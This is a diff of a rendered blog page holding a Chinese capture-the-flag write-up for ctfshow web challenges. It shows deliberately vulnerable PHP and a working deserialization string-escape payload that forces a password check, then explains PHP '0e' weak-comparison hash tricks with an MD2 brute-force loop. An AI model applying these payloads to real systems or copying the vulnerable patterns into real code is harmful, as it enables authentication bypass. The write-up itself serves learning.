@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -326,42 +326,42 @@
 </span><span class="lnt">35
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-
-<span class="k">class</span> <span class="nc">a</span>
-<span class="p">{</span>
-<span class="k">public</span> <span class="nv">$uname</span><span class="p">;</span>
-<span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
-<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$uname</span><span class="p">,</span><span class="nv">$password</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uname</span><span class="o">=</span><span class="nv">$uname</span><span class="p">;</span>
-    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="nv">$password</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
-<span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="s1">&#39;yu22x&#39;</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
-            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>	
-        <span class="p">}</span>
-        <span class="k">else</span>
-        <span class="p">{</span>
-            <span class="k">echo</span> <span class="s1">&#39;wrong password&#39;</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>  <span class="c1">// 字符串处理
-</span><span class="c1"></span>    <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;Firebasky&#39;</span><span class="p">,</span><span class="s1">&#39;Firebaskyup&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="nv">$uname</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// 接收参数
-</span><span class="c1"></span><span class="nv">$password</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// 初始password值
-</span><span class="c1"></span><span class="nv">$ser</span><span class="o">=</span><span class="nx">filter</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">a</span><span class="p">(</span><span class="nv">$uname</span><span class="p">,</span><span class="nv">$password</span><span class="p">)));</span>
-<span class="nv">$test</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">a</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="nv">$uname</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$uname</span><span class="p">,</span><span class="nv">$password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">uname</span><span class="o">=</span><span class="nv">$uname</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">=</span><span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="o">===</span><span class="s1">&#39;yu22x&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>	
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;wrong password&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">){</span>  <span class="c1">// 字符串处理
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;Firebasky&#39;</span><span class="p">,</span><span class="s1">&#39;Firebaskyup&#39;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$uname</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="c1">// 接收参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$password</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="c1">// 初始password值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$ser</span><span class="o">=</span><span class="nx">filter</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">a</span><span class="p">(</span><span class="nv">$uname</span><span class="p">,</span><span class="nv">$password</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p> ​ ​ ​ ​ ​ 锁定flag的条件<code>$this-&gt;password==='yu22x'</code>，但是初始password=1，，我们要让password等于'yu22x'，就需要构造字符逃逸<code>&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;}</code>闭合前面的<code>&quot;、{</code>，让后面的password值无法被提取。</p>
 <p> ​ ​ ​ ​ ​ 此时，我们的序列化字符串为：</p>
@@ -370,8 +370,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">O</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;a&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;uname&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">30</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">&#34;password&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;yu22x&#34;</span><span class="p">;}</span><span class="s2">&#34;;s:8:&#34;</span><span class="nx">password</span><span class="s2">&#34;;i:1;}
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="s2">&#34;a&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;uname&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">30</span><span class="o">:</span><span class="s2">&#34;&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">&#34;password&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;yu22x&#34;</span><span class="p">;}</span><span class="s2">&#34;;s:8:&#34;</span><span class="nx">password</span><span class="s2">&#34;;i:1;}
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p> ​ ​ ​ ​ ​ payload大致结构已经没什么问题，但是uname值的属性<code>s:30:&quot;&quot;;</code>会让uname在反序列化时取30长度的字符，而我们的输入根本不会在代码执行后改变字符长度。这时候就需要函数<code>Filter</code>，Filter的作用是将Firebasky替换为Firebaskyup，替换后会多出两个字符，在反序列化时我们就能''逃出''两个字符，通过15个Firebasky就可以让30个字符<code>&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;}</code>全部逃出。</p>
 <p>payload</p>
@@ -380,8 +380,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky</span><span class="s2">&#34;;s:8:&#34;</span><span class="nx">password</span><span class="s2">&#34;;s:5:&#34;</span><span class="nx">yu22x</span><span class="s2">&#34;;}
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky</span><span class="s2">&#34;;s:8:&#34;</span><span class="nx">password</span><span class="s2">&#34;;s:5:&#34;</span><span class="nx">yu22x</span><span class="s2">&#34;;}
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>比赛时就做出这道题了，之后全在划水。(菜哭了...)</p>
 <h1 id="web2_故人心"><a href="#web2_故人心" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:web2_故人心" class="headings">web2_故人心</a></h1>
@@ -421,35 +421,35 @@
 </span><span class="lnt">28
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
-<span class="nv">$b</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
-<span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
-<span class="nv">$url</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
-<span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="k">and</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">7</span> <span class="k">and</span> <span class="nv">$a</span><span class="o">!=</span><span class="mi">0</span> <span class="k">and</span> <span class="nv">$a</span><span class="o">**</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
-    <span class="nv">$d</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$b</span><span class="o">==</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$c</span><span class="o">==</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)));</span>
-    <span class="k">if</span><span class="p">(</span><span class="nv">$d</span><span class="p">){</span>
-             <span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;hint.php&#39;</span><span class="p">);</span>
-             <span class="k">if</span><span class="p">(</span><span class="nx">filter_var</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nx">FILTER_VALIDATE_URL</span><span class="p">)){</span>
-                <span class="nv">$host</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
-                <span class="nx">print_r</span><span class="p">(</span><span class="nv">$host</span><span class="p">);</span> 
-                <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ctfshow\.com$/&#39;</span><span class="p">,</span><span class="nv">$host</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">])){</span>
-                    <span class="nx">print_r</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
-                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-                    <span class="k">echo</span> <span class="s1">&#39;差点点就成功了！&#39;</span><span class="p">;</span>
-                <span class="p">}</span>
-            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-                <span class="k">echo</span> <span class="s1">&#39;please give me url!!!&#39;</span><span class="p">;</span>
-            <span class="p">}</span>
-    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-        <span class="k">echo</span> <span class="s1">&#39;想一想md5碰撞原理吧?!&#39;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span><span class="k">else</span><span class="p">{</span>
-    <span class="k">echo</span> <span class="s1">&#39;第一个都过不了还想要flag呀?!&#39;</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$url</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span> <span class="k">and</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">7</span> <span class="k">and</span> <span class="nv">$a</span><span class="o">!=</span><span class="mi">0</span> <span class="k">and</span> <span class="nv">$a</span><span class="o">**</span><span class="mi">2</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$d</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$b</span><span class="o">==</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$c</span><span class="o">==</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$d</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">             <span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;hint.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">             <span class="k">if</span><span class="p">(</span><span class="nx">filter_var</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="nx">FILTER_VALIDATE_URL</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$host</span><span class="o">=</span><span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">print_r</span><span class="p">(</span><span class="nv">$host</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ctfshow\.com$/&#39;</span><span class="p">,</span><span class="nv">$host</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">print_r</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">echo</span> <span class="s1">&#39;差点点就成功了！&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="s1">&#39;please give me url!!!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;想一想md5碰撞原理吧?!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;第一个都过不了还想要flag呀?!&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="第一关"><a href="#第一关" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:第一关" class="headings">第一关</a></h3>
 <blockquote>
@@ -463,10 +463,10 @@
 </blockquote>
 <p>访问robots.txt得到一个新的文件地址/hinthint.txt，访问后得到</p>
 <pre tabindex="0"><code>Is it particularly difficult to break MD2?!
-I'll tell you quietly that I saw the payoad of the author.
+I&#39;ll tell you quietly that I saw the payoad of the author.
 But the numbers are not clear.have fun~~~~
-xxxxx024452    hash(&quot;md2&quot;,$b)
-xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
+xxxxx024452    hash(&#34;md2&#34;,$b)
+xxxxxx48399    hash(&#34;md2&#34;,hash(&#34;md2&#34;,$b))
 </code></pre><p>看了还是没什么思路，那就从md5碰撞原理着手。</p>
 <blockquote>
 <p> ​ ​ ​ ​ ​ 在<code>==(弱等于)</code>的情况下，<strong>字符串与数字的比较会转化为数字与数字的比较</strong>，而php对<code>0e...</code>结构的字符串与数字比较时会统一解释为<code>数字0</code>。</p>
@@ -479,12 +479,12 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465a&#39;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// true
-</span><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e123&#39;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// true
-</span><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465a&#39;</span><span class="o">==</span><span class="s1">&#39;0e123&#39;</span><span class="p">);</span> <span class="c1">// false；这是字符串与字符串的比较，并不满足转换规则
-</span><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465a&#39;</span><span class="o">==</span><span class="mf">0e123</span><span class="p">);</span> <span class="c1">// true；这是字符串与数字的比较，满足转换规则
-</span><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465&#39;</span><span class="o">==</span><span class="s1">&#39;0e123&#39;</span><span class="p">);</span> <span class="c1">// true；这是&#34;伪数字&#34;间的比较。
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465a&#39;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e123&#39;</span><span class="o">==</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// true
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465a&#39;</span><span class="o">==</span><span class="s1">&#39;0e123&#39;</span><span class="p">);</span> <span class="c1">// false；这是字符串与字符串的比较，并不满足转换规则
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465a&#39;</span><span class="o">==</span><span class="mf">0e123</span><span class="p">);</span> <span class="c1">// true；这是字符串与数字的比较，满足转换规则
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="s1">&#39;0e44465&#39;</span><span class="o">==</span><span class="s1">&#39;0e123&#39;</span><span class="p">);</span> <span class="c1">// true；这是&#34;伪数字&#34;间的比较。
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p> ​ ​ ​ ​ ​ 为什么<code>'0e44465a'!='0e123'</code>，而<code>'0e44465'=='0e123'</code>呢？这是因为<code>0e数字</code>结构的字符串会被php认作<strong>科学计数法</strong>，等效数字即为0，但其依然是<strong>字符串</strong>。因此<code>'0e44465a'!='0e123'</code>是字符串间的比较；<code>'0e44465'=='0e123'</code>是科学计数法之间的比较。<strong>md5碰撞就是通过科学计数法的比较完成弱等于的判断</strong>。</p>
 </blockquote>
@@ -509,22 +509,22 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">99999</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
-    <span class="nv">$x1</span><span class="o">=</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span> <span class="s1">&#39;0e&#39;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s1">&#39;024452&#39;</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$x1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">===</span><span class="s1">&#39;0e&#39;</span>  <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$x1</span><span class="p">)){</span>
-        <span class="k">break</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
